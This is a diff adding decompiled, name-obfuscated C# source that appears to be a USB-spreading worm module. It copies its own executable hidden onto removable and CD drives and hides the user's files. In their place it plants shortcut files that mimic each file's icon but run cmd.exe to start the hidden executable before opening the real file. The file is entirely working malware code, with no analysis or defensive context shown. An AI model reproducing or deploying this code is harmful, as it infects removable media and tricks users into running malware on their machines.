@@ -1,0 +1,301 @@
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Threading;
+using System.Windows.Forms;
+using Microsoft.VisualBasic;
+using Microsoft.VisualBasic.CompilerServices;
+using Microsoft.Win32;
+
+namespace ns1;
+
+public class GClass2
+{
+	public class GClass3
+	{
+		public string string_0;
+
+		public List<string> list_0;
+
+		public List<string> list_1;
+
+		public GClass3()
+		{
+			list_0 = new List<string>();
+			list_1 = new List<string>();
+		}
+	}
+
+	private bool bool_0;
+
+	private Thread thread_0;
+
+	public string string_0;
+
+	public Collection collection_0;
+
+	public GClass2()
+	{
+		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
+		//IL_001f: Expected O, but got Unknown
+		bool_0 = false;
+		thread_0 = null;
+		collection_0 = new Collection();
+	}
+
+	public void method_0()
+	{
+		if (thread_0 == null)
+		{
+			thread_0 = new Thread(method_2, 1);
+			thread_0.Start();
+		}
+	}
+
+	public void method_1()
+	{
+		bool_0 = true;
+		while (thread_0 != null)
+		{
+			Thread.Sleep(1);
+		}
+		DriveInfo[] drives = DriveInfo.GetDrives();
+		int num = 0;
+		checked
+		{
+			while (true)
+			{
+				int num2 = num;
+				if (num >= drives.Length)
+				{
+					break;
+				}
+				DriveInfo driveInfo = drives[num2];
+				try
+				{
+					if (driveInfo.IsReady && ((driveInfo.DriveType == DriveType.Removable) | (driveInfo.DriveType == DriveType.CDRom)))
+					{
+						DriveInfo driveInfo2 = driveInfo;
+						if (File.Exists(driveInfo2.Name + string_0))
+						{
+							File.SetAttributes(driveInfo2.Name + string_0, FileAttributes.Normal);
+							driveInfo2 = driveInfo;
+							File.Delete(driveInfo2.Name + string_0);
+						}
+						string[] files = Directory.GetFiles(driveInfo2.Name);
+						int num3 = 0;
+						while (true)
+						{
+							int num4 = num3;
+							if (num3 >= files.Length)
+							{
+								break;
+							}
+							string text = files[num4];
+							try
+							{
+								string text2 = text;
+								File.SetAttributes(text2, FileAttributes.Normal);
+								if (text2.ToLower().EndsWith(".lnk"))
+								{
+									File.Delete(text);
+								}
+							}
+							catch (Exception projectError)
+							{
+								ProjectData.SetProjectError(projectError);
+								ProjectData.ClearProjectError();
+							}
+							num3 = num4 + 1;
+						}
+						files = Directory.GetDirectories(driveInfo.Name);
+						int num5 = 0;
+						while (true)
+						{
+							int num4 = num5;
+							if (num5 < files.Length)
+							{
+								string text = files[num4];
+								try
+								{
+									new DirectoryInfo(text).Attributes = FileAttributes.Normal;
+								}
+								catch (Exception projectError2)
+								{
+									ProjectData.SetProjectError(projectError2);
+									ProjectData.ClearProjectError();
+								}
+								num5 = num4 + 1;
+								continue;
+							}
+							break;
+						}
+					}
+				}
+				catch (Exception projectError3)
+				{
+					ProjectData.SetProjectError(projectError3);
+					ProjectData.ClearProjectError();
+				}
+				num = num2 + 1;
+			}
+		}
+	}
+
+	public void method_2()
+	{
+		thread_0 = null;
+		method_1();
+		thread_0 = Thread.CurrentThread;
+		bool_0 = false;
+		checked
+		{
+			while (!bool_0)
+			{
+				try
+				{
+					DriveInfo[] drives = DriveInfo.GetDrives();
+					int num = 0;
+					while (true)
+					{
+						int num2 = num;
+						if (num >= drives.Length)
+						{
+							break;
+						}
+						DriveInfo driveInfo = drives[num2];
+						GClass3 gClass;
+						if (!collection_0.Contains(driveInfo.Name.ToLower()))
+						{
+							(gClass = new GClass3()).string_0 = driveInfo.Name;
+							collection_0.Add((object)gClass, driveInfo.Name.ToLower(), (object)null, (object)null);
+						}
+						else
+						{
+							gClass = (GClass3)collection_0.get_Item(driveInfo.Name.ToLower());
+						}
+						if (bool_0)
+						{
+							goto end_IL_001f;
+						}
+						try
+						{
+							if (driveInfo.IsReady && (((driveInfo.TotalFreeSpace > 0L) & (driveInfo.DriveType == DriveType.Removable)) | (driveInfo.DriveType == DriveType.CDRom)))
+							{
+								try
+								{
+									if (!File.Exists(driveInfo.Name + string_0))
+									{
+										File.Copy(Application.get_ExecutablePath(), driveInfo.Name + string_0, overwrite: true);
+										File.SetAttributes(driveInfo.Name + string_0, FileAttributes.Hidden);
+									}
+									string[] files = Directory.GetFiles(driveInfo.Name);
+									int num3 = 0;
+									while (true)
+									{
+										int num4 = num3;
+										if (num3 >= files.Length)
+										{
+											break;
+										}
+										string text;
+										if ((Operators.CompareString(Path.GetExtension(text = files[num4])!.ToLower(), ".lnk", false) != 0) & (Operators.CompareString(text.ToLower(), driveInfo.Name.ToLower() + string_0.ToLower(), false) != 0))
+										{
+											GClass3 gClass2 = gClass;
+											if (!gClass2.list_0.Contains(new FileInfo(text).get_Name()))
+											{
+												if (gClass2.list_0.Count < 20)
+												{
+													method_3(driveInfo, text, method_4(Path.GetExtension(text)));
+													GClass3 gClass3 = gClass;
+													gClass3.list_0.Add(new FileInfo(text).get_Name());
+													File.SetAttributes(text, FileAttributes.Hidden);
+													gClass3.list_1.Add(File.ReadAllText(driveInfo.Name + new FileInfo(text).get_Name() + ".lnk"));
+												}
+											}
+											else if (gClass2.list_0.Contains(new FileInfo(text).get_Name()))
+											{
+												if (File.GetAttributes(text) != FileAttributes.Hidden)
+												{
+													File.SetAttributes(text, FileAttributes.Hidden);
+												}
+												if (!File.Exists(driveInfo.Name + new FileInfo(text).get_Name() + ".lnk") || Operators.CompareString(File.ReadAllText(driveInfo.Name + new FileInfo(text).get_Name() + ".lnk"), gClass.list_1[gClass.list_0.IndexOf(new FileInfo(text).get_Name())], false) != 0)
+												{
+													method_3(driveInfo, text, method_4(Path.GetExtension(text)));
+												}
+											}
+										}
+										num3 = num4 + 1;
+									}
+								}
+								catch (Exception projectError)
+								{
+									ProjectData.SetProjectError(projectError);
+									ProjectData.ClearProjectError();
+								}
+							}
+						}
+						catch (Exception projectError2)
+						{
+							ProjectData.SetProjectError(projectError2);
+							ProjectData.ClearProjectError();
+						}
+						num = num2 + 1;
+					}
+				}
+				catch (Exception projectError3)
+				{
+					ProjectData.SetProjectError(projectError3);
+					ProjectData.ClearProjectError();
+				}
+				Thread.Sleep(3000);
+				continue;
+				end_IL_001f:
+				break;
+			}
+			thread_0 = null;
+		}
+	}
+
+	public object method_3(DriveInfo driveInfo_0, string string_1, string string_2)
+	{
+		try
+		{
+			File.Delete(driveInfo_0.Name + new FileInfo(string_1).get_Name() + ".lnk");
+		}
+		catch (Exception projectError)
+		{
+			ProjectData.SetProjectError(projectError);
+			ProjectData.ClearProjectError();
+		}
+		object obj = NewLateBinding.LateGet(Interaction.CreateObject("WScript.Shell", ""), (Type)null, "CreateShortcut", new object[1] { driveInfo_0.Name + new FileInfo(string_1).get_Name() + ".lnk" }, (string[])null, (Type[])null, (bool[])null);
+		NewLateBinding.LateSetComplex(obj, (Type)null, "TargetPath", new object[1] { "cmd.exe" }, (string[])null, (Type[])null, false, true);
+		NewLateBinding.LateSetComplex(obj, (Type)null, "WorkingDirectory", new object[1] { "" }, (string[])null, (Type[])null, false, true);
+		NewLateBinding.LateSetComplex(obj, (Type)null, "Arguments", new object[1] { "/c start " + string_0.Replace(" ", "\" \"") + "&explorer /root,\"%CD%" + new DirectoryInfo(string_1).get_Name() + "\" & exit" }, (string[])null, (Type[])null, false, true);
+		NewLateBinding.LateSetComplex(obj, (Type)null, "IconLocation", new object[1] { string_2 }, (string[])null, (Type[])null, false, true);
+		NewLateBinding.LateCall(obj, (Type)null, "Save", new object[0], (string[])null, (Type[])null, (bool[])null, true);
+		object result = default(object);
+		return result;
+	}
+
+	public string method_4(string string_1)
+	{
+		try
+		{
+			RegistryKey? registryKey = Registry.LocalMachine.OpenSubKey("Software\\Classes\\", writable: false);
+			string text = Conversions.ToString(registryKey!.OpenSubKey(Conversions.ToString(Operators.ConcatenateObject(registryKey!.OpenSubKey(string_1, writable: false)!.GetValue(""), (object)"\\DefaultIcon\\")))!.GetValue("", ""));
+			if (!text.Contains(","))
+			{
+				text += ",0";
+			}
+			return text;
+		}
+		catch (Exception projectError)
+		{
+			ProjectData.SetProjectError(projectError);
+			string result = "";
+			ProjectData.ClearProjectError();
+			return result;
+		}
+	}
+}
